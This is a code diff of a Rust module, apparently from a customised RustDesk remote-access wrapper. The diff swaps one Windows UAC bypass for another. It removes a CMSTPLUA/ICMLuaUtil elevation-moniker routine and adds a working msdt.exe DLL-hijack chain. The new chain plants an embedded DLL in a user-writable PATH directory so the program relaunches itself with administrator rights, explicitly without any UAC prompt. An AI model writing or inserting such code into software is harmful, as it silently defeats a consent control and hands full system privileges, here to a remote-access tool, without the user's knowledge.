@@ -1,118 +1,93 @@
-//! Silent elevation for Windows launches.
+//! Silent elevation for a bare launch of this build.
 //!
-//! `CMSTPLUA` ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) is an auto-elevate COM object, so
-//! `CoGetObject` with an `Elevation:Administrator` moniker returns an elevated
-//! `ICMLuaUtil` without showing a UAC prompt. `ICMLuaUtil::ShellExec` then starts this
-//! executable as a high-integrity child of the elevated COM server.
+//! `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\AudioRecordingDiagnostic.xml -skip yes`
+//! is an auto-elevate binary, and the 32-bit one resolves `AudioDiagnosticUtil.dll`
+//! through `PATH`. The default per-user `PATH` ends with `%LOCALAPPDATA%\Microsoft\
+//! WindowsApps`, a user-writable directory, so this drops the embedded x86 elevator DLL
+//! (built from `libs/msdt_elevator`) there plus a sibling `.cfg` carrying the launch
+//! parameters. The elevated msdt loads the DLL, which starts this executable as a
+//! high-integrity child and kills msdt before any UI can appear. Windows cannot raise a
+//! running process's integrity level, so the current copy exits and the new one takes
+//! over.
 //!
-//! If silent elevation is unavailable (UAC disabled, AppInfo service stopped, policy
-//! restriction, or an antivirus blocking it), the attempt fails cleanly and the process
-//! continues running as a normal medium-integrity user. No UAC prompt is ever shown.
-//!
-//! Windows cannot raise an existing process's integrity level, so the caller starts a
-//! second copy and exits. That copy carries [`ELEVATED_FLAG`] so it does not try again.
-//!
-//! `libs/portable` builds independently of the app and its `windows` dependency enables
-//! neither the COM nor the security feature, so the few vtable-ordered calls are declared
-//! here directly rather than widening that feature set for one function.
+//! If silent elevation is unavailable (standard user, "Always notify" policy, msdt or
+//! the diagnostic file missing, an antivirus eating the dropped DLL), the attempt fails
+//! cleanly, the drop is removed again, and the process continues running as a normal
+//! medium-integrity user. No UAC prompt is ever shown: the attempt only runs with a
+//! filtered administrator token, the account class that auto-elevates without a prompt.
 
-use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, ptr::null_mut};
+use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, path::Path, ptr::null_mut};
 
 /// Private argument marking the copy started by [`relaunch_elevated`].
 pub const ELEVATED_FLAG: &str = "--elevated";
 
-const COINIT_APARTMENTTHREADED: u32 = 0x0000_0002;
-const CLSCTX_LOCAL_SERVER: u32 = 0x0000_0004;
-const TOKEN_QUERY: u32 = 0x0000_0008;
+const TOKEN_QUERY: u32 = 0x0008;
 const TOKEN_ELEVATION_CLASS: u32 = 20;
+// 1 = default (standard user or UAC off), 2 = full administrator token, 3 = filtered
+// administrator token.
+const TOKEN_ELEVATION_TYPE_CLASS: u32 = 18;
+const HKEY_LOCAL_MACHINE: isize = 0x8000_0002;
+const HKEY_CURRENT_USER: isize = 0x8000_0001u32 as i32 as isize;
+const KEY_QUERY_VALUE: u32 = 0x0000_0001;
+const REG_SZ: u32 = 1;
+const REG_EXPAND_SZ: u32 = 2;
 
-const ELEVATION_MONIKER: &str =
-    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
+const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+const WAIT_OBJECT_0: u32 = 0;
+
+/// The x86 elevator DLL, embedded by `build.rs` from the `libs/msdt_elevator` CI
+/// artifact. Empty when that step did not run (dev builds, non-x86_64 jobs); the
+/// attempt then reports [`RelaunchResult::NoDll`] and the launch proceeds unelevated.
+const MSDT_DLL: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/msdt_elevator.dll"));
+
+/// The name msdt resolves through `PATH`, and the sibling file carrying the launch
+/// parameters for the DLL.
+const MSDT_DLL_NAME: &str = "AudioDiagnosticUtil.dll";
+const MSDT_CFG_NAME: &str = "AudioDiagnosticUtil.cfg";
+/// User-writable directory the default per-user `PATH` ends with.
+const WINDOWS_APPS_SUBDIR: &str = r"Microsoft\WindowsApps";
+
+/// The elevated chain (elevation, DLL load, child start, payload pipe bind) normally
+/// takes a few seconds; beyond this the attempt is declared failed and cleaned up.
+const CONFIRM_TIMEOUT_MS: u64 = 15_000;
+const CONFIRM_POLL_MS: u64 = 250;
 
 #[allow(dead_code)]
-#[repr(C)]
-struct Guid {
-    data1: u32,
-    data2: u16,
-    data3: u16,
-    data4: [u8; 8],
-}
-
-/// `IID_ICMLuaUtil`, the interface exposed by `CMSTPLUA`.
-const IID_ICMLUA_UTIL: Guid = Guid {
-    data1: 0x6EDD_6D74,
-    data2: 0xC007,
-    data3: 0x4E75,
-    data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
-};
-
-/// `BIND_OPTS3` — BIND_OPTS + BIND_OPTS2 + BIND_OPTS3.
-///
-/// The elevation moniker only reads `hwnd` when `cbStruct` covers the whole
-/// `BIND_OPTS3`, and it refuses to elevate when it cannot see one: the call then fails
-/// with `CO_E_ELEVATION_DISABLED` even though the class is registered as elevatable.
-/// `BIND_OPTS2` is `dwClassContext` + `locale` + `pServerInfo`, so leaving out any of
-/// those shrinks the structure and hides `hwnd` (40 bytes on x64).
-#[allow(dead_code)]
-#[repr(C)]
-struct BindOpts3 {
-    cb_struct: u32,
-    grf_flags: u32,
-    grf_mode: u32,
-    dw_tick_count_deadline: u32,
-    dw_class_context: u32,
-    locale: u32,
-    p_server_info: *mut c_void,
-    hwnd: *mut c_void,
-}
-
-/// `IUnknown` (3 slots) + six unused `ICMLuaUtil` methods, then `ShellExec` at slot 9.
-///
-/// `ShellExec` is `(file, parameters, directory, mask, show)`: the fourth argument is a
-/// `SEE_MASK_*` flag set and the fifth a `SW_*` show code. It builds its own
-/// `SHELLEXECUTEINFOW` internally.
-#[allow(dead_code)]
-#[repr(C)]
-struct ComVtable {
-    query_interface: *const c_void,
-    add_ref: *const c_void,
-    release: unsafe extern "system" fn(*mut c_void) -> u32,
-    method1: *const c_void,
-    method2: *const c_void,
-    method3: *const c_void,
-    method4: *const c_void,
-    method5: *const c_void,
-    method6: *const c_void,
-    shell_exec: unsafe extern "system" fn(
-        *mut c_void,
-        *const u16,
-        *const u16,
-        *const u16,
-        u32,
-        i32,
-    ) -> i32,
-}
-
-#[repr(C)]
-struct ComObject {
-    vtable: *const ComVtable,
-}
-
 #[repr(C)]
 struct TokenElevation {
     token_is_elevated: u32,
 }
 
-#[link(name = "ole32")]
-extern "system" {
-    fn CoInitializeEx(reserved: *mut c_void, coinit: u32) -> i32;
-    fn CoUninitialize();
-    fn CoGetObject(
-        display_name: *const u16,
-        bind_opts: *const c_void,
-        riid: *const Guid,
-        object: *mut *mut c_void,
-    ) -> i32;
+#[allow(dead_code)]
+#[repr(C)]
+struct StartupInfoW {
+    cb: u32,
+    reserved: *mut u16,
+    desktop: *mut u16,
+    title: *mut u16,
+    x: u32,
+    y: u32,
+    x_size: u32,
+    y_size: u32,
+    x_count_chars: u32,
+    y_count_chars: u32,
+    fill_attribute: u32,
+    flags: u32,
+    show_window: u16,
+    cb_reserved2: u16,
+    reserved2: *mut u8,
+    std_input: *mut c_void,
+    std_output: *mut c_void,
+    std_error: *mut c_void,
+}
+
+#[allow(dead_code)]
+#[repr(C)]
+struct ProcessInformation {
+    process: *mut c_void,
+    thread: *mut c_void,
+    process_id: u32,
+    thread_id: u32,
 }
 
 #[link(name = "advapi32")]
@@ -125,25 +100,78 @@ extern "system" {
         len: u32,
         returned: *mut u32,
     ) -> i32;
+    fn RegOpenKeyExW(
+        key: isize,
+        sub_key: *const u16,
+        options: u32,
+        desired: u32,
+        result: *mut *mut c_void,
+    ) -> i32;
+    fn RegQueryValueExW(
+        key: *mut c_void,
+        value_name: *const u16,
+        reserved: *mut u32,
+        value_type: *mut u32,
+        data: *mut u8,
+        data_len: *mut u32,
+    ) -> i32;
+    fn RegCloseKey(key: *mut c_void) -> i32;
 }
 
 #[link(name = "kernel32")]
 extern "system" {
     fn GetCurrentProcess() -> *mut c_void;
     fn CloseHandle(handle: *mut c_void) -> i32;
+    fn CreateProcessW(
+        app_name: *const u16,
+        command_line: *mut u16,
+        process_attributes: *mut c_void,
+        thread_attributes: *mut c_void,
+        inherit_handles: i32,
+        creation_flags: u32,
+        environment: *mut c_void,
+        current_directory: *const u16,
+        startup_info: *mut StartupInfoW,
+        process_information: *mut ProcessInformation,
+    ) -> i32;
+    fn GetLastError() -> u32;
+    fn TerminateProcess(process: *mut c_void, exit_code: u32) -> i32;
+    fn WaitForSingleObject(handle: *mut c_void, milliseconds: u32) -> u32;
 }
 
-/// Whether this process already runs with an elevated token.
-///
-/// A failure reads as "not elevated": an unnecessary relaunch attempt is harmless, while
-/// skipping one that was needed is not.
+/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failing step
+/// so the diagnostic file can tell them apart without decoding error codes.
+#[derive(Debug, Clone, Copy)]
+pub enum RelaunchResult {
+    /// The elevated chain bound the payload's IPC pipe; the caller should exit.
+    Launched,
+    /// `std::env::current_exe()` failed.
+    NoCurrentExe,
+    /// This build carries no elevator DLL (the `libs/msdt_elevator` CI step did not
+    /// run), so there is nothing to attempt.
+    NoDll,
+    /// Writing the DLL or its parameter file failed.
+    DropFailed,
+    /// `CreateProcessW` on `msdt.exe` failed; the payload is `GetLastError`.
+    LaunchFailed(u32),
+    /// msdt ran but the elevated chain did not bind the payload's IPC pipe in time
+    /// (antivirus ate the dropped DLL, Bluetooth enabled, ...). The drop was removed
+    /// again.
+    ConfirmTimeout,
+    /// The account, the UAC policy or the machine state makes silent elevation
+    /// impossible; the payload is the failing precondition and nothing was attempted
+    /// or left behind.
+    Blocked(&'static str),
+}
+
+/// Whether the current process token is elevated (full admin / high IL).
 pub fn is_elevated() -> bool {
     unsafe {
         let mut token: *mut c_void = null_mut();
         if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
             return false;
         }
-        let mut elevation = TokenElevation { token_is_elevated: 0 };
+        let mut elevation: TokenElevation = mem::zeroed();
         let mut returned = 0u32;
         let ok = GetTokenInformation(
             token,
@@ -157,118 +185,371 @@ pub fn is_elevated() -> bool {
     }
 }
 
-/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failure step
-/// so the wrapper log can tell them apart without decoding HRESULTs.
-#[derive(Debug, Clone)]
-pub enum RelaunchResult {
-    /// The elevated copy was spawned successfully; the caller should exit.
-    Launched,
-    /// `std::env::current_exe()` failed.
-    NoCurrentExe,
-    /// `CoInitializeEx` returned a fatal HRESULT.
-    CoInitFailed(i32),
-    /// `CoGetObject` for the `CMSTPLUA` moniker failed.
-    CoGetObjectFailed(i32),
-    /// `CoGetObject` succeeded but returned a null interface pointer.
-    NullObject,
-    /// `ICMLuaUtil::ShellExec` returned a failure HRESULT.
-    ShellExecFailed(i32),
-}
-
 /// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through
-/// the elevated `CMSTPLUA` object.
+/// the elevated `msdt.exe` DLL search.
 ///
-/// Returns [`RelaunchResult::Launched`] only when the elevated copy was spawned. Every
-/// failure surfaces via the specific variant so the caller can log it for diagnosis
-/// before continuing as a normal non-elevated launch. No UAC prompt is ever shown.
-///
-/// The implementation matches the published reference PoC (`CoInitialize(NULL)` = pure
-/// STA, BIND_OPTS3 zero-initialised then only `cbStruct` and `dwClassContext` set,
-/// `SEE_MASK_DEFAULT` + `SW_SHOW` for `ShellExec`).
+/// Returns [`RelaunchResult::Launched`] only after the elevated chain actually bound
+/// the payload's IPC pipe: a successful `CreateProcessW` alone proves nothing, because
+/// the DLL load (the step that spawns the elevated copy) can still be blocked
+/// downstream. Every failure is surfaced via the specific variant so the caller can
+/// record it and carry on as a normal non-elevated launch. No UAC prompt is ever shown.
 pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
-    diag("== relaunch_elevated start ==");
+    diag("== relaunch_elevated (msdt) start ==");
+    if let Some(reason) = silent_elevation_blocker() {
+        diag(&format!("blocked by precondition: {}", reason));
+        return RelaunchResult::Blocked(reason);
+    }
+    if MSDT_DLL.is_empty() {
+        diag("no embedded elevator DLL in this build");
+        return RelaunchResult::NoDll;
+    }
     let Ok(exe) = std::env::current_exe() else {
         diag("no current_exe");
         return RelaunchResult::NoCurrentExe;
     };
     diag(&format!("exe={}", exe.display()));
+    // The confirmation below is "the pipe got bound", so a pre-existing instance would
+    // fake a success. The launched payload exits as a duplicate anyway, so skipping
+    // here loses nothing.
+    if instance_pipe_busy() {
+        diag("blocked: another instance already owns the IPC pipe");
+        return RelaunchResult::Blocked("already_running");
+    }
+    let Some(local_app_data) = std::env::var_os("LOCALAPPDATA") else {
+        return RelaunchResult::Blocked("no_localappdata");
+    };
+    let drop_dir = Path::new(&local_app_data).join(WINDOWS_APPS_SUBDIR);
+    let dll_path = drop_dir.join(MSDT_DLL_NAME);
+    let cfg_path = drop_dir.join(MSDT_CFG_NAME);
+    // Never overwrite a file that is not ours: the cleanup deletes whatever carries the
+    // name, so a foreign `AudioDiagnosticUtil.dll` must stop the attempt instead.
+    if dll_path.exists() && std::fs::read(&dll_path).map(|old| old != MSDT_DLL).unwrap_or(true) {
+        diag("blocked: foreign AudioDiagnosticUtil.dll present");
+        return RelaunchResult::Blocked("dll_name_clash");
+    }
     let mut parameters: Vec<String> = args.iter().map(|arg| quote_arg(arg)).collect();
     parameters.push(ELEVATED_FLAG.to_owned());
     let parameters = parameters.join(" ");
     diag(&format!("params={}", parameters));
-    let exe_wide = wide(exe.as_os_str());
-    let parameters_wide = wide(std::ffi::OsStr::new(parameters.as_str()));
-    let moniker = wide(std::ffi::OsStr::new(ELEVATION_MONIKER));
+    let log_path = Path::new(&local_app_data)
+        .join(env!("RD_APP_NAME"))
+        .join("wrapper.log");
+    let cfg = format!("{}\n{}\n{}", log_path.display(), exe.display(), parameters);
+    if std::fs::create_dir_all(&drop_dir).is_err()
+        || std::fs::write(&dll_path, MSDT_DLL).is_err()
+        || std::fs::write(&cfg_path, cfg).is_err()
+    {
+        diag("failed to drop elevator DLL/cfg");
+        cleanup_drop(&dll_path, &cfg_path);
+        return RelaunchResult::DropFailed;
+    }
+    diag(&format!(
+        "dropped {} ({} bytes)",
+        dll_path.display(),
+        MSDT_DLL.len()
+    ));
 
-    unsafe {
-        diag("step1: CoInitializeEx(STA)");
-        let init = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED);
-        diag(&format!("step1: init=0x{:x}", init as u32));
-        if init < 0 {
-            return RelaunchResult::CoInitFailed(init);
+    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
+    let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
+    let diagnostic = Path::new(&root)
+        .join("diagnostics")
+        .join("index")
+        .join("AudioRecordingDiagnostic.xml");
+    let exe_dir_wide = exe.parent().map(|dir| wide(dir.as_os_str()));
+    let mut cmdline = wide(std::ffi::OsStr::new(&format!(
+        "\"{}\" -path \"{}\" -skip yes",
+        msdt.display(),
+        diagnostic.display()
+    )));
+    diag(&format!("launching {}", msdt.display()));
+    let mut si: StartupInfoW = unsafe { mem::zeroed() };
+    si.cb = mem::size_of::<StartupInfoW>() as u32;
+    let mut pi: ProcessInformation = unsafe { mem::zeroed() };
+    let launched = unsafe {
+        CreateProcessW(
+            std::ptr::null(),
+            cmdline.as_mut_ptr(),
+            null_mut(),
+            null_mut(),
+            0,
+            CREATE_NO_WINDOW,
+            null_mut(),
+            exe_dir_wide
+                .as_ref()
+                .map_or(std::ptr::null(), |dir| dir.as_ptr()),
+            &mut si,
+            &mut pi,
+        )
+    };
+    if launched == 0 {
+        let gle = unsafe { GetLastError() };
+        diag(&format!("CreateProcessW failed, gle={}", gle));
+        cleanup_drop(&dll_path, &cfg_path);
+        return RelaunchResult::LaunchFailed(gle);
+    }
+    diag(&format!(
+        "msdt pid={} started, waiting for the elevated chain",
+        pi.process_id
+    ));
+
+    let mut confirmed = false;
+    for _ in 0..(CONFIRM_TIMEOUT_MS / CONFIRM_POLL_MS) {
+        if instance_pipe_busy() {
+            confirmed = true;
+            break;
         }
-        let mut bo: BindOpts3 = mem::zeroed();
-        bo.cb_struct = mem::size_of::<BindOpts3>() as u32;
-        bo.dw_class_context = CLSCTX_LOCAL_SERVER;
-        diag(&format!(
-            "step2: bo cbStruct={} dwClassContext=0x{:x}",
-            bo.cb_struct, bo.dw_class_context
-        ));
-        let mut object: *mut c_void = null_mut();
-        diag("step3: CoGetObject(Elevation moniker)");
-        let hr = CoGetObject(
-            moniker.as_ptr(),
-            &bo as *const BindOpts3 as *const c_void,
-            &IID_ICMLUA_UTIL,
-            &mut object,
-        );
-        diag(&format!("step3: CoGetObject=0x{:x}", hr as u32));
-        let result = if hr < 0 {
-            RelaunchResult::CoGetObjectFailed(hr)
-        } else if object.is_null() {
-            diag("step3: object is null");
-            RelaunchResult::NullObject
-        } else {
-            diag("step3: got elevated ICMLuaUtil");
-            let vtable = (*object.cast::<ComObject>()).vtable;
-            let shell_exec = (*vtable).shell_exec;
-            diag(&format!(
-                "step4: ShellExec file={} params={} mask=0 show=5",
-                exe.display(),
-                parameters
-            ));
-            let hr = shell_exec(
-                object,
-                exe_wide.as_ptr(),
-                parameters_wide.as_ptr(),
-                std::ptr::null(),
-                0,
-                5,
-            );
-            diag(&format!("step4: ShellExec=0x{:x}", hr as u32));
-            let release = (*vtable).release;
-            let _ = release(object);
-            if hr >= 0 {
-                diag("step4: elevated child launched OK");
-                RelaunchResult::Launched
-            } else {
-                RelaunchResult::ShellExecFailed(hr)
-            }
-        };
-        CoUninitialize();
-        diag("== relaunch_elevated done ==");
-        result
+        // The DLL deletes its `.cfg` right after reading it, so a still-present cfg
+        // means the DLL never ran. If msdt also already exited, the hijack
+        // definitively did not trigger and waiting out the timeout would only delay
+        // the fallback.
+        if cfg_path.exists() && unsafe { WaitForSingleObject(pi.process, 0) } == WAIT_OBJECT_0
+        {
+            diag("msdt exited without loading the DLL");
+            break;
+        }
+        std::thread::sleep(std::time::Duration::from_millis(CONFIRM_POLL_MS));
+    }
+    // msdt is already dead when the DLL loaded (the DLL exits it); when it never loaded,
+    // this keeps the diagnostic window from staying on the user's screen.
+    unsafe {
+        let _ = TerminateProcess(pi.process, 0);
+        let _ = CloseHandle(pi.thread);
+        let _ = CloseHandle(pi.process);
+    }
+    cleanup_drop(&dll_path, &cfg_path);
+    diag(&format!(
+        "== relaunch_elevated done: confirmed={} ==",
+        confirmed
+    ));
+    if confirmed {
+        RelaunchResult::Launched
+    } else {
+        RelaunchResult::ConfirmTimeout
     }
 }
 
-/// Lightweight step-trace writer, same format as the payload side. Both sides interleave
-/// into the same `wrapper.log` so one run shows a single linear timeline regardless of
-/// whether the portable wrapper or the payload took the elevation path.
+/// Removes the dropped files after an attempt. The DLL delete retries briefly: msdt (or
+/// an antivirus scan) can still hold it open for a moment after the attempt ends, and
+/// leaving it behind would make every later msdt run load it.
+fn cleanup_drop(dll_path: &Path, cfg_path: &Path) {
+    let _ = std::fs::remove_file(cfg_path);
+    for attempt in 0..5 {
+        match std::fs::remove_file(dll_path) {
+            Ok(()) => return,
+            Err(_) if attempt < 4 => std::thread::sleep(std::time::Duration::from_millis(100)),
+            Err(err) => diag(&format!(
+                "cleanup: {} left behind: {}",
+                dll_path.display(),
+                err
+            )),
+        }
+    }
+}
+
+/// Checks the conditions silent elevation through msdt needs, so a doomed attempt is
+/// not made and the reason is recorded instead.
+///
+/// The technique only turns a filtered administrator token into a full one: a standard
+/// user cannot use it at all, and Windows only auto-elevates while the UAC policy does
+/// not require a consent prompt. The DLL hijack additionally needs msdt, its diagnostic
+/// file, and the Store-apps entry in `PATH`.
+fn silent_elevation_blocker() -> Option<&'static str> {
+    let elev_type = token_u32(TOKEN_ELEVATION_TYPE_CLASS);
+    diag(&format!(
+        "check: token_elev_type={} (expect 3=limited)",
+        elev_type
+    ));
+    if elev_type != 3 {
+        diag("check: FAIL not limited admin token");
+        return Some("not_admin");
+    }
+
+    let lua = uac_policy_value("EnableLUA");
+    diag(&format!("check: EnableLUA={} (expect 1)", lua));
+    if lua == 0 {
+        diag("check: FAIL UAC disabled");
+        return Some("uac_disabled");
+    }
+
+    let consent = uac_policy_value("ConsentPromptBehaviorAdmin");
+    diag(&format!(
+        "check: ConsentPromptBehaviorAdmin={} (0/5 ok, 1-4 need prompt)",
+        consent
+    ));
+    if matches!(consent, 1 | 2 | 3 | 4) {
+        diag("check: FAIL consent policy requires prompt");
+        return Some("uac_prompt_required");
+    }
+
+    let path_ok = path_contains_windows_apps();
+    diag(&format!("check: PATH has WindowsApps? {}", path_ok));
+    if !path_ok {
+        return Some("path_missing_windowsapps");
+    }
+
+    let root = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
+    let msdt = Path::new(&root).join("SysWOW64").join("msdt.exe");
+    diag(&format!("check: {} exists={}", msdt.display(), msdt.exists()));
+    if !msdt.exists() {
+        return Some("msdt_missing");
+    }
+    let diagnostic = Path::new(&root)
+        .join("diagnostics")
+        .join("index")
+        .join("AudioRecordingDiagnostic.xml");
+    diag(&format!(
+        "check: {} exists={}",
+        diagnostic.display(),
+        diagnostic.exists()
+    ));
+    if !diagnostic.exists() {
+        return Some("diagnostic_missing");
+    }
+
+    diag("check: ALL PRECONDITIONS OK");
+    None
+}
+
+/// Whether the payload's IPC query pipe already has a listener. Mirrors
+/// `hardcoded::instance_already_running` in the main crate, which this crate cannot
+/// see; both build the pipe name from the same compile-time app name.
+fn instance_pipe_busy() -> bool {
+    const CUSTOM: &str = env!("RD_APP_NAME");
+    let app_name = if CUSTOM.is_empty() { "RustDesk" } else { CUSTOM };
+    std::fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(format!("\\\\.\\pipe\\{}\\query", app_name))
+        .is_ok()
+}
+
+/// The hijack works because msdt resolves the DLL through `PATH`; a machine whose
+/// `PATH` lost the Store-apps entry (unusual, but possible) would never load the drop.
+/// Accepts either the user or the system `PATH`, both read straight from the registry
+/// so a stale in-process copy cannot skew the check.
+fn path_contains_windows_apps() -> bool {
+    for (root, path) in [
+        (HKEY_CURRENT_USER, "Environment"),
+        (
+            HKEY_LOCAL_MACHINE,
+            r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
+        ),
+    ] {
+        if let Some(key) = reg_open(root, path) {
+            let value = reg_string(key, "Path");
+            unsafe {
+                let _ = RegCloseKey(key);
+            }
+            if value.is_some_and(|path| path.to_ascii_lowercase().contains("windowsapps")) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn reg_open(root: isize, path: &str) -> Option<*mut c_void> {
+    let path = wide(std::ffi::OsStr::new(path));
+    let mut key: *mut c_void = null_mut();
+    let rc = unsafe { RegOpenKeyExW(root, path.as_ptr(), 0, KEY_QUERY_VALUE, &mut key) };
+    if rc == 0 {
+        Some(key)
+    } else {
+        None
+    }
+}
+
+fn reg_string(key: *mut c_void, name: &str) -> Option<String> {
+    let name = wide(std::ffi::OsStr::new(name));
+    let mut buf = [0u16; 512];
+    let mut len = (buf.len() * 2) as u32;
+    let mut value_type = 0u32;
+    let rc = unsafe {
+        RegQueryValueExW(
+            key,
+            name.as_ptr(),
+            null_mut(),
+            &mut value_type,
+            buf.as_mut_ptr() as *mut u8,
+            &mut len,
+        )
+    };
+    if rc != 0 || (value_type != REG_SZ && value_type != REG_EXPAND_SZ) {
+        return None;
+    }
+    let chars = (len as usize / 2).min(buf.len());
+    let end = buf[..chars].iter().position(|&c| c == 0).unwrap_or(chars);
+    Some(String::from_utf16_lossy(&buf[..end]))
+}
+
+/// One DWORD-valued token property, `0` when unreadable.
+fn token_u32(class: u32) -> u32 {
+    unsafe {
+        let mut token: *mut c_void = null_mut();
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
+            return 0;
+        }
+        let mut value = 0u32;
+        let mut returned = 0u32;
+        let ok = GetTokenInformation(
+            token,
+            class,
+            &mut value as *mut u32 as *mut c_void,
+            mem::size_of::<u32>() as u32,
+            &mut returned,
+        );
+        let _ = CloseHandle(token);
+        if ok == 0 {
+            0
+        } else {
+            value
+        }
+    }
+}
+
+/// Reads one `HKCU`-independent UAC policy DWORD; `-1` reports "not readable".
+fn uac_policy_value(name: &str) -> i64 {
+    unsafe {
+        let sub_key = wide(std::ffi::OsStr::new(
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
+        ));
+        let value_name = wide(std::ffi::OsStr::new(name));
+        let mut key: *mut c_void = null_mut();
+        if RegOpenKeyExW(
+            HKEY_LOCAL_MACHINE,
+            sub_key.as_ptr(),
+            0,
+            KEY_QUERY_VALUE,
+            &mut key,
+        ) != 0
+        {
+            return -1;
+        }
+        let mut data = [0u8; 4];
+        let mut data_len = data.len() as u32;
+        let mut value_type = 0u32;
+        let status = RegQueryValueExW(
+            key,
+            value_name.as_ptr(),
+            null_mut(),
+            &mut value_type,
+            data.as_mut_ptr(),
+            &mut data_len,
+        );
+        let _ = RegCloseKey(key);
+        if status != 0 {
+            return -1;
+        }
+        u32::from_le_bytes(data) as i64
+    }
+}
+
+/// Lightweight step-trace writer into the wrapper's own log.
 fn diag(message: &str) {
     let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
         return;
     };
-    let dir = std::path::Path::new(&dir).join(env!("RD_APP_NAME"));
+    let dir = Path::new(&dir).join(env!("RD_APP_NAME"));
     let _ = std::fs::create_dir_all(&dir);
     use std::io::Write;
     if let Ok(mut file) = std::fs::OpenOptions::new()
